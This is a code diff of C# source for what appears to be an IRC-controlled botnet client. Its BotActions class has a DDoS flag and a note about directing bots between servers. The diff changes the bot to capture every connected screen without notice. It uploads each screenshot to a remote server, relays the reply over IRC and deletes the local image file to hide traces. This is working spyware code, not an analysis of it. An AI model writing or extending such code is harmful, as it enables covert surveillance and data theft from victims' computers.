@@ -20,7 +20,10 @@ namespace tom
 
         public Boolean DDoSing = false;
 
-
+        /* TODO LIST
+            - "move" command to get bots to change servers or channel. (join more then one?)
+            - 
+        */
         public BotActions(IRC irc)
         {
             this.irc = irc;
@@ -112,29 +115,36 @@ namespace tom
 
         }
 
-        public void ScreenShot()
+        public void TakeScreenShots()
         {
-            // *** Take screenshot
+            Screen[] screens = Screen.AllScreens;
+            foreach (Screen screen in screens)
+            {
+                //Create a new bitmap.
+                var bmpScreenshot = new Bitmap(screen.Bounds.Width,
+                                               screen.Bounds.Height,
+                                               PixelFormat.Format32bppArgb);
 
-            //Create a new bitmap.
-            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
-                                           Screen.PrimaryScreen.Bounds.Height,
-                                           PixelFormat.Format32bppArgb);
+                // Create a graphics object from the bitmap.
+                var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
 
-            // Create a graphics object from the bitmap.
-            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
+                // Take the screenshot from the upper left corner to the right bottom corner.
+                gfxScreenshot.CopyFromScreen(screen.Bounds.X,
+                                            screen.Bounds.Y,
+                                            0,
+                                            0,
+                                            screen.Bounds.Size,
+                                            CopyPixelOperation.SourceCopy);
 
-            // Take the screenshot from the upper left corner to the right bottom corner.
-            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
-                                        Screen.PrimaryScreen.Bounds.Y,
-                                        0,
-                                        0,
-                                        Screen.PrimaryScreen.Bounds.Size,
-                                        CopyPixelOperation.SourceCopy);
+                // Save the screenshot to the specified path that the user has chosen.
+                bmpScreenshot.Save("test.jpg", ImageFormat.Jpeg);
 
-            // Save the screenshot to the specified path that the user has chosen.
-            bmpScreenshot.Save("test.jpg", ImageFormat.Jpeg);
-
+                SendImageToServer();
+            }
+        }
+    
+        public void SendImageToServer()
+        {
             // *** Send to server
             String temp = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\test.jpg";
             // Load a image
@@ -153,6 +163,8 @@ namespace tom
 
                 irc.SendMessage(System.Text.Encoding.Default.GetString(response));
             }
+
+            File.Delete(System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\test.jpg");
         }
 
         static System.Drawing.Image GetImage(string filePath)
